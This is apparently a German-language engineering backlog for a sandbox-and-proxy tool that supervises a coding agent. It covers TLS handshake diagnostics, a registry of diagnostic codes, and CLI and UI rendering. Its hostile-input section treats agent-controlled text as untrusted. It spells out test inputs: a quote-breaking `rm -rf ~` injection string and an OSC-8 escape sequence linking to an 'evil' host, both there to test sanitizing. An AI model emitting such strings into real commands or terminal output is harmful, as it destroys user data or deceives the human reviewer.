- [x] `curl --cacert <fremde Wurzel> https://example.com` in der Sandbox erzeugt `TLS_001` mit `CURL_CA_BUNDLE`-Fix im UI und in `humanitl flows list --json` (Feld `error`). **Umformuliert und gemessen am 2026-09-11, nach HUM-149.** Die frühere Fassung nannte `--cacert /dev/null`; mit dem echten curl kann sie nie `TLS_001` ergeben, weil curl dabei gar kein Zertifikat sieht. Mit einer vorhandenen, fremden Wurzel (`ISRG_Root_X1.crt`) stehen Karte und Flow, gemessen gegen einen echten Daemon (Einzelheiten unter HUM-149). **Die Vorgeschichte, wie sie am 2026-09-11 aufgeschrieben wurde:** Abgehakt war das Kästchen auf den Integrationstest hin, und der nimmt einen rustls-Client, der mitten im Handschlag mit `unknown_ca` abbricht. curl 8.22 mit OpenSSL 3.6 tut das nicht: Mit `--cacert /dev/null` scheitert es schon beim Laden der Datei (Exit 77), der Proxy verbucht einen Flow mit `tls_handshake_failed`, aber als abgerissenen Handschlag und ohne `TLS_001`. Mit einer vorhandenen, fremden Wurzel (`--cacert …/ISRG_Root_X1.crt`) schließt curl den TLS-1.3-Handschlag vollständig ab, prüft das Zertifikat danach und legt ohne Alert auf (Exit 60); der Proxy sieht eine gelungene Verbindung ohne Anfrage und verbucht nichts. `openssl s_client -verify_return_error` dagegen erzeugt Flow und Befund. Die Oberflächen-Hälfte steht seit HUM-106; was fehlt, ist die Erkennung im Proxy, und die liegt als HUM-149.
- [x] Fix „In config.toml schreiben" schreibt `[sandbox.env]` nach `config.toml`, sichtbar in `humanitl config get sandbox.env`. **Umformuliert und gemessen am 2026-09-11, mit HUM-151.** Die frühere Fassung nannte „Für nächste Session setzen" und das globale Profil. Seit HUM-066 ist ein globales Profil aber eine eigene Ebene über `config.toml`, und ein Knopf, der das Profil verspräche, versprach mehr, als er hält (Stand-Abschnitt unten). Gemessen gegen einen echten `humanitld` in `app/test/features/sandbox/daemon_live_test.dart`, `the_ca_write_of_the_button_is_what_config_get_reads`: Der Schreiber des Knopfes schreibt über den echten Client, und `humanitl --json config get sandbox.env` antwortet danach mit `CURL_CA_BUNDLE` auf `/etc/humanitl/ca.crt` und der Herkunft `config.toml`. Einzelheiten unter HUM-151. **Die Vorgeschichte:** Lesen ging schon vorher (`humanitl config get sandbox.env` antwortete `{}`, lokal aufgelöst ohne Daemon), geschrieben wurde nichts, weil `SetConfig` bis dahin `unimplemented` antwortete.

### Stand (2026-09-04): nur die Daemon-Hälfte

Erkennung, Zuordnung und Aufzeichnung sind fertig:

- `daemon/crates/proxy/src/tls_observe.rs` mit `TlsFailure`, `ToolHint`,
  `classify`, `tool_hint` und `diagnostic_for` samt der Tabelle der Hinweise;
  `HandshakeWatch` zählt Abbrüche im 10-Sekunden-Fenster für `TLS_002`,
  entstört `TLS_001` je Host und Hinweis für 60 Sekunden und führt den
  Zähler der unterdrückten Versuche in der nächsten Karte mit.
- `handler.rs` hängt den gescheiterten Handschlag an den Flow des `CONNECT`,
  der Recorder schreibt `error = tls_handshake_failed` (Migration
  `V4__flow_error.sql`), und `humanitl flows list --json` zeigt das Feld
  `error`.
- Tests grün: `classify_unknown_ca`, `classify_eof`,
  `tool_hint_from_user_agent`, `tls_002_after_three_resets` und die sechs
  Integrationstests in `daemon/crates/proxy/tests/tls_observe.rs`, darunter
  `a_client_without_a_trust_store_gets_one_tls_001_and_a_flow_with_an_error`.

**Offen und ausdrücklich nicht gedeckt:**

**Nachtrag 2026-09-12: die ersten beiden Punkte sind zu; was darunter steht, ist Vorgeschichte.** Den `diagnosticsProvider` und die Karte im Feed gibt es seit HUM-106 (`app/lib/features/intercept/providers/diagnostics.dart`, gelesen in `app/lib/features/intercept/widgets/diagnostic_card.dart:93`). `SetConfig` ist seit HUM-151 für `sandbox.env.<NAME>` implementiert (`daemon/crates/ipc/src/server.rs`, `set_config` über `config_rpc::set`). Offen bleibt nur, was der zweite Punkt zuletzt nennt: `humanitl config set` gibt es nicht (`daemon/bin/humanitl/src/cli.rs`, `ConfigCmd` kennt `Get` und `Schema`), und `GetConfig` antwortet weiter `unimplemented` und wartet auf HUM-069.

- **Die Oberfläche.** Es gab keinen `diagnosticsProvider` und keine Karte im
  Feed. `FlowEvent.diagnostic` kommt in der App an und wird verworfen
  (`app/lib/features/intercept/providers/flows.dart`,
  `app/lib/features/history/providers/history_page.dart`). Bis dahin sieht ein
  Mensch den TLS-Fehler nur in `humanitl flows list --json` und im Protokoll
  des Agenten. Der Platz dafür ist
  `app/lib/features/intercept/widgets/diagnostic_card.dart`. Das ist
  **HUM-106** (`BACKLOG.md`, Sprint-2-Tabelle), angelegt am 2026-09-04;
  HUM-068 hängt für seinen `Flow`-Scope daran.
- **Der Knopf „Für nächste Session setzen".** Er bräuchte einen
  Schreibweg in die Konfiguration, und den gab es nicht: der RPC `SetConfig`
  antwortete `unimplemented` und wartete auf den Einstellungen-Bildschirm
  (HUM-069); seit HUM-151 schreibt er `sandbox.env.<NAME>` nach `config.toml`
  (`daemon/crates/ipc/src/server.rs`, `set_config` über `config_rpc::set`,
  nachgesehen am 2026-09-12). `humanitl config set` gibt es weiterhin nicht (`CLI_004:
  unrecognized subcommand 'set'`, gemessen). Das betrifft nur das Schreiben:
  `humanitl config get` löst lokal auf und braucht den Daemon nicht, nur der
  RPC `GetConfig` ist ebenfalls unimplementiert.
- Der Befund selbst trägt den Vorschlag bereits — `FixAction::SetEnv` je
  Hinweis, dazu den Kopierbefehl für die laufende Sitzung. Es fehlt die
  Hand, die ihn ausführt.

**Abweichung mit Folge: „globales Profil" heißt seit HUM-066 etwas anderes
als `config.toml`.** `docs/profiles.md:91-99` macht `config.toml` zur Ebene 2
und die Profile zu den Ebenen 3 und 4; ein Profil setzt Konfigurationswerte im
Block `[config.sandbox]`, also auch `env`. Ein globales Profil, das
`sandbox.env` mitbringt, überstimmt damit genau die Stelle, in die der Fix
schreiben würde. Nach `config.toml` zu schreiben bleibt trotzdem richtig, weil
`profiles/default.toml` mit Absicht leer ist und der Wert so über jedes
gewählte Profil hinweg gilt — aber der Knopf verspricht dann mehr, als er
halten kann.

Wer ihn baut, schuldet deshalb zweierlei: den `why` des Befunds um den Satz
zu ergänzen, dass ein globales Profil mit eigenem `sandbox.env` den Fix
überstimmt (heute nennt `tls_observe.rs:437-446` nur den Fall, dass das
Sandbox-Profil die Variable schon in seinem `[env]` trägt), und die Beschriftung
so zu wählen, dass sie kein Profil verspricht, das sie nicht schreibt.

### Fallstricke
- Nicht jeder Client sendet einen Alert; viele schließen einfach. Deshalb `EofBeforeFinished` als eigener Fall mit Schwellwert, sonst False Positives bei normalen Abbrüchen.
- `User-Agent` im CONNECT-Request ist optional; curl sendet ihn, Node nicht immer. Hint `Unknown` ist der häufige Fall.
- `TLS_001` darf nicht pro Retry spammen: dedupe pro (Host, Hint) für 60 s, Zähler in der Karte.

### Referenzen
BACKLOG.md Abschnitt 4 (TLS), Abschnitt 5 (Usability §6); CONVENTIONS.md 3.2 (Diagnostic). rustls `AlertDescription`, HTTP-Toolkit-Liste der CA-Env-Variablen (https://httptoolkit.com/blog/announcing-terminal-interception/).

---

## HUM-068 · Geführte Diagnostics im Sandbox-Screen
Sprint: 3 · Größe: XL · Abhängigkeiten: HUM-040, HUM-041 (hart: `Check`-Scope und Isolations-Reiter), HUM-043 (`SANDBOX_020..025`), HUM-044 (`SANDBOX_017`, `SANDBOX_018`, `LLM_008`), HUM-045, HUM-063, HUM-106 (`diagnosticsProvider`, `flowId` auf `FlowEvent.diagnostic`, Feed-Karte); für jeden `ChangeSetting`-/`SetEnv`-Fix HUM-069 · Blockiert: HUM-046

### Kontext
ADR-012: Jeder nicht-grüne Zustand trägt Grund und Fix. Dieses Issue schließt die Lücken im Sandbox-Bereich, hält das Register der Codes an der einen Stelle, die es schon gibt (`daemon/crates/core-types/src/diagnostics/codes.rs`, 80 Codes, 18 Bereiche, erzeugtes `docs/DIAGNOSTICS.md`), und stellt sicher, dass jede Diagnostic im UI am Ort des Problems erscheint und in der CLI als Block.

### Ziel
`docs/DIAGNOSTICS.md` (erzeugt, byte-genau durch `daemon/crates/core-types/tests/diag_docs.rs`) trägt zu jedem Code zusätzlich Auslöser und Fix-Hinweis. Die Registerprüfung „jeder verwendete Code ist registriert" wird vom Compiler getragen. Der Sandbox-Screen rendert Diagnostics kontextbezogen: Start-Fehler im Header, Mount-Fehler im Mounts-Tab, Isolations-Fehler im Isolations-Reiter (nach HUM-041), TLS-Fehler als Feed-Karte (nach HUM-106). Die CLI rendert denselben Block überall gleich, farbig auf einem TTY, und säubert, was sie druckt.

### Nicht-Ziel
Keine neuen Prüfungen. Keine Diagnostics für Regeln oder Editor (Sprint 4). Keine zweite Datei `docs/diagnostics.md` neben `docs/DIAGNOSTICS.md` (auf einem Dateisystem ohne Groß/Klein-Unterscheidung dieselbe Datei; alle `docs_anchor` und jede `docs:`-URL zeigen auf die erzeugte). Kein `DiagnosticScope` auf der Leitung in diesem Issue (Vertragsänderung, eigenes Issue). Keine zweisprachige `why` (siehe Stand).

### Betroffene Pfade
- `daemon/crates/core-types/src/diagnostics/codes.rs`: `CodeInfo` bekommt `trigger` und `fix_hint`, gefüllt für alle 80 Codes (geteilte Datei; Struktur-Änderung anmelden); `daemon/crates/core-types/src/diagnostics/mod.rs`: Feld von `DiagnosticCode` privat, `const fn` nur für das Makro `registry!` — es gibt keine `src/diagnostic.rs`, kein `DiagnosticCode::ALL` (die Liste heißt `CODES`), kein `Diagnostic::for_flow`/`for_session`
- `daemon/crates/core-types/tests/diag_docs.rs`: `render()` druckt die zwei neuen Spalten unter `#### CODE`; `docs/DIAGNOSTICS.md` neu erzeugen mit `UPDATE_DIAG_DOCS=1 cargo test -p humanitl-core --test diag_docs`
- `daemon/bin/humanitl/src/render.rs` (vorhanden, 371 Zeilen, seit 2026-09-03, mit sechs Tests): Farbe auf `std::io::IsTerminal`, Säuberung in `diagnostic_block`
- `daemon/bin/humanitl/src/cmd/mod.rs` (`exit_code`), nur wenn Akzeptanzkriterium 3 auf Exit 3 bleibt (siehe Spezifikation)
- `app/lib/core/ui/h_diagnostic_card.dart` (vorhanden, eine Variante): daneben `HDiagnosticRow` und `HDiagnosticBanner`, alle drei ohne Nutzer-String; `app/lib/core/ui/diagnostic_severity.dart` (neu): die eine Abbildung Severity → Label/Farbe, heute sechsmal dupliziert (`sandbox_screen.dart`, `setup_screen.dart`, `intercept/widgets/action_bar.dart`, `rules/severity.dart`, `tray/widgets/attention_notice.dart`, `history/history_filter_bar.dart`)
- `app/lib/features/sandbox/**`: Platzierung (`_Diagnostics` für Session-Befunde, `SandboxHeader` liest `status.blocking` schon, `MountsTab`); Isolations-Reiter erst nach HUM-041
- `app/lib/features/intercept/widgets/diagnostic_card.dart`: Feed-Karte — gehört HUM-106, hier nur eingebunden
- `daemon/crates/config`: `sandbox.mounts.cache` mit Tier, Beschreibung, Default, `docs/CONFIG.md`, nur wenn `SANDBOX_018`-Cache (siehe Katalog) gebaut wird

### Spezifikation

`DiagnosticScope` bleibt eine **Client-Einteilung**, nicht ein Feld auf `Diagnostic`: `Diagnostic` hat sechs Felder (`code`, `severity`, `title`, `why`, `fix`, `docs`), die Proto-Nachricht ebenfalls, `app/lib/core/domain/diagnostic.dart` spiegelt sie. Die Oberfläche leitet den Ort ab: aus `SandboxUpdate.diagnostic` (Session ⇒ Sandbox-Header), aus `SandboxEvent.check` (Check ⇒ Isolations-Zeile, HUM-041), aus `FlowEvent.flow_diagnostic` mit `flow_id` (Flow ⇒ Feed-Karte und Flow-Detail, HUM-106), aus dem Setup (Setting ⇒ neben dem Feld). Wer den Scope wirklich auf die Leitung will, fügt `DiagnosticScope scope = 7;` hinzu, erzeugt beide Seiten neu und erweitert `convert.dart` — eigenes Issue.

Katalog Sprint 3 (**Auszug** als Lesehilfe; verbindlich ist `CODES` in `codes.rs`, und `every_code_has_a_heading_in_the_rendered_docs` hält alle 80 in `docs/DIAGNOSTICS.md`):

| Code | Ort (Client) | Severity | Auslöser | fix |
|---|---|---|---|---|
| `DAEMON_001` | Global | Error (Client), Blocking (Daemon) | Daemon nicht erreichbar | `InstallService` (eine Aktion; die Leitung trägt eine) |
| `DAEMON_002` | Global | Blocking | Proto-Major-Mismatch | `OpenUrl` |
| `CONFIG_001` | Setting(`sandbox.profile`) | Blocking | Config-Datei ungültig | `CopyCommand` |
| `CONFIG_002` | Setting(`sandbox.profile`) | Blocking | Unbekannter Schlüssel | `OpenUrl(file)` |
| `CONFIG_003` | Session | Blocking | Wert außerhalb des Bereichs; Projekt-Profil setzt gesperrten Schlüssel oder mountet Host-Pfade | keine (kein Schreibweg) |
| `CONFIG_007` | Session | Warning | Projekt-Profil gehört einem anderen Konto | keine |
| `CONFIG_008`, `CONFIG_009` | Session | Info, Warning | eigenes Profil verdeckt mitgeliefertes; Profilwunsch des Projekts gilt nicht | keine |
| `CONFIG_004` | Global | Info | Laufzeitverzeichnis ist ein Ersatz | keine |
| `SANDBOX_001..003` | Global | Blocking | bwrap fehlt / zu alt / userns | `CopyCommand` |
| `SANDBOX_005`, `SANDBOX_006` | Session | Blocking | Projektordner nicht beschreibbar; Mount verboten | wie `bwrap.rs`/`profile.rs` |
| `SANDBOX_010..012` | Session | Blocking | Starter-Fehler (Argumentliste, Platzhalter, Kommandozeile) | `CopyCommand("journalctl --user -u humanitld")` — `humanitl daemon logs` gibt es nicht |
| `SANDBOX_013` | Session | Blocking | kein Shim-Report | wie oben |
| `SANDBOX_014..016` | Check(1..3) | Blocking | Check 1/2/3 fehlgeschlagen | siehe HUM-041 |
| `SANDBOX_017`, `SANDBOX_018` | Global | Blocking | kein seccomp im Kernel; `$XDG_RUNTIME_DIR` (HUM-044) | `docs`, `CopyCommand` |
| `SANDBOX_020..025` | Session | Warning/Info | `unmask`, kein `openat2`, Symlink nach außen, Findings in Dateien, Snapshot gekürzt, ohne Maske ins Projekt geschrieben (HUM-043) | siehe HUM-043 |
| `AGENT_001..004` | Global / Setting(`agent.command`) | Blocking/Warning | opencode fehlt; Override nicht ausführbar; Vorlage; in der Sandbox nicht erreichbar | `CopyCommand`, `ChangeSetting` (inert bis HUM-069) |
| `LLM_001..003`, `LLM_006`, `LLM_007` | Setting(`llm.endpoint`) | siehe HUM-039 | | |
| `LLM_004` | Setting(`llm.endpoint`) | Info | Kein Modell konfiguriert | |
| `LLM_005` | Flow | Warning | Funde in einer durchgereichten Anfrage | |
| `LLM_008` | Setting(`llm.endpoint`) | Info | nicht konfiguriert (HUM-044) | |
| `TLS_001..003` | Flow / Global | Warning/Info | siehe HUM-045 | `SetEnv`, `AddRule` |
| `TERM_001` | Session | Error | zweiter **schreibender** Terminal-Client | keine |

Die erste Fassung nannte `PROJECT_001/002` (kein Bereich), `CONFIG_001..004` mit fremden Bedeutungen (`CONFIG_004` ist das Laufzeitverzeichnis, die Profilfälle sind `007..009`), `SANDBOX_001..005` als fünf Voraussetzungen (004 ist „Isolation-Check fehlgeschlagen", 005 „Projektordner nicht beschreibbar"), `SANDBOX_010..013` als Check-Codes (CONVENTIONS 4.11 hat das umgestellt), `SANDBOX_030/031` (Bereich endet bei 029) und `LLM_000` (Bereich beginnt bei 001). Die Tabelle oben nimmt die lebenden Nummern. Ein Watchdog „Agent-Prozess sofort beendet" und ein Cache-Volume-Befund bekämen `SANDBOX_017`/`018`, die HUM-044 schon belegt; die nächsten freien sind `SANDBOX_026..029` (025 hat HUM-043 belegt), und der Cache-Fix braucht vorher den Schlüssel `sandbox.mounts.cache` im Schema (heute: `sandbox.env`, `sandbox.profile`, `sandbox.work_dir`, `sandbox.work_mode`).

CLI-Renderer: `render.rs` ist da und hat ein anderes Format als die erste Fassung, mit zwei Tests, die es festnageln (`the_block_has_the_shape_from_the_issue`, `a_block_without_a_fix_has_three_lines`):

```
blocking[SANDBOX_015]: Isolation-Check 2: mehr als eine Tür
  why: …
  fix: …
  docs: <DOCS_BASE>#sandbox_015
```

`DOCS_BASE` ist `CARGO_PKG_REPOSITORY` + `/blob/main/docs/DIAGNOSTICS.md`; ein Host `humanitl.dev` kommt im Repository nicht vor. Der Block geht nach stderr, `--json` das Objekt nach stdout. `sandbox check` druckt `✓`/`✗`, und `tests/e2e/m1_sealed_box.sh` greift nach `✓ +$guarantee`; wer die Symbolform `ℹ ⚠ ✖ ⛔` will, schreibt beide Tests und das e2e-Skript im selben Commit um und sagt es im Commit-Text. Neu in diesem Issue: Farbe nur bei `IsTerminal` auf stderr, und `why`, `title` und jeder Fix-Text laufen vor dem Druck durch `humanitl_core::sanitize_note` — `one_line` faltet nur Leerraum und lässt ESC, CSI, OSC 8 und Bidi-Overrides stehen.

UI-Renderer: `HDiagnosticCard` (vorhanden, `card`) plus `HDiagnosticRow` (`inline`: Icon, Titel, Fix-Knopf, aufklappbar für `why`) und `HDiagnosticBanner` (volle Breite, `bg-2`, Icon, Titel, Fix rechts), alle drei ohne Nutzer-String (Vertrag der `H*`-Widgets). Farben: Info → `accent` (heute) oder `fg-1` — wer auf `fg-1` wechselt (UX 3.3: inerter Text ist nie Akzent), ändert alle sechs Stellen über die neue Abbildung; Warning → `state.held`; **Error und Blocking → `state.error`**. Nie `blocked`-Rot: `docs/UX.md` Regel 6 „Rot heißt blockiert. Fehler und Findings sind Orange", und `h_diagnostic_card.dart` sagt es selbst („never the blocked red"). Fix-Labels bleiben die verschifften aus `FixControl` (`setupFixSetEnv` „Set {key}", `setupFixChangeSetting` „Change {key}", `setupFixCopyLink`, `setupFixRemountReadOnly` „Remount read-only", `setupFixAddRule`, `setupFixInstallService`, `setupFixCopyCommand`), in `en` als Quelle; „Für nächste Session setzen" verspräche eine Handlung ohne Schreibweg. Der Docs-Link der Karte wird aus `DOCS_BASE` plus `docs_anchor` des Registers gebaut, nie aus `Diagnostic.docs_url` von der Leitung, sobald er anklickbar ist.

Registerprüfung: kein `syn`-Scanner (kein `syn`, `walkdir`, `insta` in `[workspace.dependencies]`; und ein `DiagnosticCode("…")`-Literal kommt außerhalb des Makros `registry!` nirgends vor, der Scan fände nichts). Stattdessen: Feld von `DiagnosticCode` privat (heute `pub &'static str`), Konstruktion nur über `registry!`; „verwendet, aber nicht registriert" ist dann ein Compile-Fehler. Der `debug_assert!` in `Diagnostic::builder` bleibt als Gürtel. `render_cli_format` als einfache String-Zusicherung im Stil von `render.rs`.

### Schritte
1. Katalog oben ist bereinigt; die Registerfrage für einen Watchdog/Cache-Befund (`SANDBOX_026+`, `sandbox.mounts.cache`) vorher entscheiden.
2. `CodeInfo` mit `trigger` und `fix_hint`, alle 80 füllen, `render()` erweitern, `docs/DIAGNOSTICS.md` erzeugen. Kein `docs/diagnostics.md`.
3. `DiagnosticCode` schließen; `cargo test -p humanitl-core` grün.
4. `render.rs`: Farbe auf TTY, Säuberung, Test mit `\u{1b}]8;;http://evil\u{7}` in `why` ⇒ inert.
5. Exit-Code-Frage (Kriterium 3) entscheiden und umsetzen.
6. Flutter: Severity-Abbildung an einer Stelle, `HDiagnosticRow`/`HDiagnosticBanner`, Goldens je Variante, Platzierung im Sandbox-Screen; Isolations-Reiter nach HUM-041; Feed-Karte nach HUM-106.
7. Erst dann, nach der Registerfrage: Watchdog („Agent-Prozess innerhalb 2 s beendet") und Cache-Befund.

### Tests
- `every_code_has_a_heading_in_the_rendered_docs` (vorhanden), `docs_in_sync` (vorhanden), neu `every_code_has_trigger_and_fix_hint`.
- `render_cli_format` (String-Zusicherung), `render_sanitizes_control_sequences`, `colour_only_on_tty`.
- Widget: `diagnostic_row_expands_why`, `fix_button_label_per_action` (gegen die ARB), Golden für `card`, `row`, `banner` in vier Severities.
- `sandbox_watchdog_on_immediate_exit`: Agent-Kommando `false` ⇒ Diagnostic innerhalb 3 s (mit der dann vergebenen Nummer).

### Akzeptanzkriterien
- [x] `docs/DIAGNOSTICS.md` (erzeugt) enthält jeden Code aus `CODES` mit Auslöser und Fix-Hinweis; `docs_in_sync` grün. `CodeInfo` trägt seit dem 2026-09-06 die Felder `trigger` und `fix_hint`, gefüllt für alle **117** Codes (die Spezifikation nannte 80; das Register ist seither gewachsen). Jeder Satz ist aus der Stelle gelesen, die den Befund baut, nicht aus der Spezifikation: 277 Konstruktionsstellen wurden dafür ausgewertet. Der Generator druckt beide Zeilen unter jeder Überschrift, `docs/DIAGNOSTICS.md` ist neu erzeugt (468 Zeilen mehr), und der Lauf ohne `UPDATE_DIAG_DOCS` ist grün.
- [x] Ein Code, der nicht in `registry!` steht, lässt den Bau scheitern (privates Feld), nicht erst einen Test. `DiagnosticCode` trägt sein Feld seit dem 2026-09-06 privat, es gibt keinen öffentlichen Konstruktor, und der Beweis steht als `compile_fail`-Doktest am Typ: Wer `DiagnosticCode("SANDBOX_999")` schreibt, bekommt keinen roten Test, sondern keinen Bau.
- [x] `humanitl sandbox check` auf einem System ohne bwrap zeigt den Block im verschifften Format — heute mit **Exit 1** (`SANDBOX_001` fällt in `exit_code` auf `EXIT_USER`; nur `SANDBOX_004` und `013..016` sind Exit 3, und CONVENTIONS 3.8 reserviert 3 für „Sandbox-Check fehlgeschlagen"). Wer Exit 3 will, nimmt `SANDBOX_001..003` in den `EXIT_CHECK`-Arm und ändert CONVENTIONS 3.8 und `EXIT_CODES_HELP` in `cli.rs` (Test `the_help_documents_the_exit_codes_and_every_config_key`) im selben Commit. Eine der beiden Lesarten, nicht beide.
- [x] Im Sandbox-Screen erscheinen Diagnostics am jeweils definierten Ort, nie als Modal; Blocking bleibt `state.error`. Gemessen in `app/test/features/sandbox/diagnostics_place_test.dart`: Die Befunde der Sitzung stehen als Karten im Fluss des Bildschirms, `HModal` kommt nicht vor, und die Farben sind `state.error` für blockierend, `state.held` für Warnung, `accent` für Info — nie das Rot des Blockierens. Dabei fielen zwei echte Fehler auf: Ab dem dritten Befund schob der Block den Mounts-Reiter 32 px aus dem Fenster; die Befunde nehmen jetzt höchstens ein Drittel der Höhe und rollen darüber hinaus in sich, und der Reiter überlebt eine kleine Fläche, statt Inhalt unsichtbar abzuschneiden. Dazu ist das **Wort** zu einem Schweregrad jetzt wirklich eine Funktion: `sandbox_screen.dart`, `intercept/widgets/action_bar.dart`, `setup_text.dart`, `rules/severity.dart`, `sandbox/widgets/isolation_panel.dart` und `history/history_filter_bar.dart` hatten je eine eigene Kopie und rufen jetzt die aus `core/ui/diagnostic_severity.dart`. Die **Farbe** hat eine einzige begründete Ausnahme: Die Historie zeichnet Text und nimmt deshalb die textfähigen Lesarten (`accentText`, `stateTextColor`); das steht dort und ist keine Kopie, sondern eine andere Aussage.
- [x] Ein `why` mit OSC 8 druckt in der CLI inert. `render::plain` schickt Titel, `why` und jeden Fix-Text durch `sanitize_note` und `one_line`, bevor sie in den Block gehen; zwei Tests halten es fest, und die Mutationsprobe (zurück auf `one_line` allein) macht den ersten rot. Der sichtbare Text eines OSC-8-Verweises bleibt stehen — er ist die Nachricht —, seine Wirkung nicht. `--json` brauchte nichts: `serde_json` schreibt `ESC` als `\u001b`.

### Stand (2026-09-04): Größe XL, der Katalog widersprach dem Register in 12 von 22 Zeilen, der Renderer ist längst da, beide Nicht-Global-Scopes haben weder Erzeuger noch Verbraucher

Audit von 28 Agenten gegen den Code: 21 Widersprüche, 12 blockierend, oben im Text korrigiert. Vorhanden: das Register mit `AREAS` (18 Bereiche), `registry!`, 80 Codes, `lookup`, fünf Wächtertests (`codes_are_unique`, `codes_follow_schema`, `anchors_match_the_code`, `codes_stay_inside_their_area`, `lookup_finds_registered_codes`); `DiagnosticBuilder` mit Typzustand, der ein `why` erzwingt; `diag_docs.rs` mit Generator und zwei Tests; `docs/DIAGNOSTICS.md`; `render.rs` mit `Renderer`, `diagnostic_block`, `diagnostic_json`, `docs_url`, `fix_line` für alle sieben `FixAction`, `table`, `tick`; `exit_code` in `cmd/mod.rs`; `check`/`report`/`check_failure` in `cmd/sandbox.rs`; die ganze Daemon-Hälfte der TLS-Karte (`tls_observe.rs`); `HDiagnosticCard`, `FixControl` mit sieben lokalisierten Labels; der Sandbox-Screen mit `_Diagnostics`-Block und `SandboxHeader.status.blocking`; `sanitize_note`. Daher XL statt M: nicht weil viel fehlt, sondern weil fast alles Genannte anders heißt, anders aussieht oder woanders wohnt, und weil die zwei Scopes Vorarbeit in drei anderen Issues brauchen.

**Blockierend in der ersten Fassung, jetzt korrigiert:**

- `PROJECT_001/002`: kein Bereich `PROJECT`, `codes_stay_inside_their_area` bricht. Entfallen (HUM-044 nimmt `CONFIG`/`SANDBOX_005`).
- `CONFIG_001..004` mit vier fremden Bedeutungen: lebend sind „Config-Datei ungültig", „Unbekannter Schlüssel", „Wert außerhalb des Bereichs", „Laufzeitverzeichnis ist ein Ersatz"; die Profilfälle sind `CONFIG_007..009`.
- `SANDBOX_001..005` als bwrap/alt/userns/seccomp/XDG: 004 und 005 heißen anders; seccomp und XDG sind `017`/`018` aus HUM-044.
- `SANDBOX_010` kein Report, `011..013` Checks: CONVENTIONS 4.11 legt `010..012` als Starter-Fehler und `013..016` als Check-Codes fest; `cmd/mod.rs` bestätigt es. HUM-041 trug dieselben alten Nummern und ist heute ebenfalls korrigiert.
- `SANDBOX_030/031` außerhalb des Bereichs (bis 029), `LLM_000` außerhalb (ab 001); `cargo test -p humanitl-core` würde rot.
- `render.rs` „(neu)" mit Symbolformat: existiert seit 2026-09-03 mit dem Format `severity[CODE]: title` und zwei Tests; das e2e-Skript M1 greift nach `✓`.
- Kriterium „Exit 3 ohne bwrap": heute Exit 1; beide Lesarten standen nebeneinander.
- `docs/diagnostics.md` (neu) neben dem erzeugten `docs/DIAGNOSTICS.md` mit `#### CODE`-Überschriften: Kollision und sofortige Drift.
- `daemon/crates/core-types/src/diagnostic.rs` mit `DiagnosticCode::ALL`, `for_flow`, `for_session`, `scope`: Datei gibt es nicht (`diagnostics/mod.rs`, `codes.rs`), Liste heißt `CODES`, `scope` wäre eine Vertragsänderung auf drei Seiten.
- `Check(IsolationCheck)`: nichts erzeugt, nichts verbraucht ein `CheckResult` (Dienst sendet keins, `grpc_daemon_client.dart` verwirft `check_2`, `SandboxUpdate` hat keine Variante, Isolations-Reiter ist `ComingPane`). Harte Abhängigkeit HUM-041.
- `Flow(FlowId)` ⇒ Feed-Karte: `convert.dart` bildet `diagnostic` (12) und `flow_diagnostic` (16) auf dasselbe `FlowEvent.diagnostic` ohne `flowId` ab, `flows.dart` und `history_page.dart` werfen das Ereignis weg, ein `diagnosticsProvider` existiert nirgends. Das ist seit heute **HUM-106**; hier nur Einbindung.
- Blocking in `blocked`-Rot: verboten (`docs/UX.md` Regel 6), verschifft ist `state.error` an sechs Stellen.
- `why_en`/`why_de` vom Daemon: kein solches Feld auf Kern, Leitung oder Dart; die UI übersetzt heute auch keine Titel, und die Ausgabe ist gemischtsprachig (Registertitel deutsch, `why` englisch). Das ist ein echter Mangel, der hier **nicht** behoben wird; beide Wege (Feldpaar auf der Leitung, oder Titel über beide ARBs je Code) sind größer als ein Fallstrick und brauchen ein eigenes Issue.
- Weiter korrigiert: `humanitl.dev` als Docs-Host; `SANDBOX_012` als „Unexpected socket" (das ist 015); Fix-Labels gegen die verschifften ARB-Einträge; `syn`/`walkdir`/`insta` ohne Eintrag und ohne Fundstelle; `diagnostic_card.dart` heißt `h_diagnostic_card.dart` und hat eine Variante; `sandbox.mounts.cache` und `Setting(profile)` sind keine Schema-Schlüssel; `humanitl daemon logs` und `humanitl sessions logs` gibt es nicht; „vollständige Liste" mit rund 30 von 80 Codes.

**Offen, hier nicht entschieden:** Exit 1 oder 3 für `SANDBOX_001..003`; Symbolformat oder verschifftes Format; Info-Farbe `accent` oder `fg-1`; die Sprache von `title` und `why` (eigenes Issue); Nummern und Schlüssel für Watchdog und Cache-Befund.

**Seit dem Audit überholt:** HUM-040 ist gemerged (Sandbox-Screen mit `_Diagnostics`, Header, Reitern); HUM-106 ist angelegt und trägt den Flow-Pfad (`diagnosticsProvider`, `flowId`, Karte).

**Aus dem Audit nicht bestätigt:** nichts Wesentliches; die Zählung „80 Codes" wurde am Register nachgezählt und stimmt.

**Feindliche Eingabe:** eine Stelle, und sie ist die Mitte dieses Issues. `Diagnostic.why` wird im Daemon aus Werten gebaut, die der Agent wählt — `tls_observe.rs` setzt `host.display()` aus CONNECT/SNI in `TLS_001`, `SANDBOX_015` trägt Socket-Pfade aus der Sandbox, `SANDBOX_022` (HUM-043) Symlink-Pfad und -Ziel, `AGENT_001/002` `agent.command` — und HUM-068 stellt diesen Text vor einen Menschen, im Terminal und in einer Karte, neben einen Knopf. Drei Schuldigkeiten: (1) `render.rs::one_line` säubert keine Escape-Sequenzen; eine `why` mit OSC 8 oder Bidi-Override wird zum Link oder zum umgedrehten Satz im Terminal des Nutzers (der deklarierte Kanal aus AGENTS.md); `sanitize_note` existiert und wird dort nicht benutzt. (2) `Diagnostic.docs_url` reist über die Leitung und wird in Dart wörtlich kopiert; als anklickbarer Link wäre das ein neues Loch — Link aus `DOCS_BASE` plus `docs_anchor`, nie aus der Leitung. (3) `CopyCommand` legt mit einem Klick Text in die Zwischenablage; ein interpolierter Pfad mit `'` bricht aus; `shlex` ist Workspace-Abhängigkeit, damit quotieren, Test mit `a'; rm -rf ~; '`. Keine Grenze in der Sandbox selbst — die menschliche Entscheidung ist die Grenze.

### Fallstricke
- `why` muss die konkreten Werte enthalten (Pfad, Host, Version), nicht nur Platzhalter. Diagnostics werden im Daemon mit Werten formatiert; jeder Wert, der vom Agenten stammt, ist vorher gesäubert und gedeckelt.
- Keine Diagnostic ohne Code. Keine zwei Codes für denselben Auslöser. Eine Nummer wird nie wiederverwendet (`codes.rs`, Kopf).
- CLI-Farben nur bei `IsTerminal` auf stderr, sonst nackter Text; `--json` bleibt farblos auf stdout.
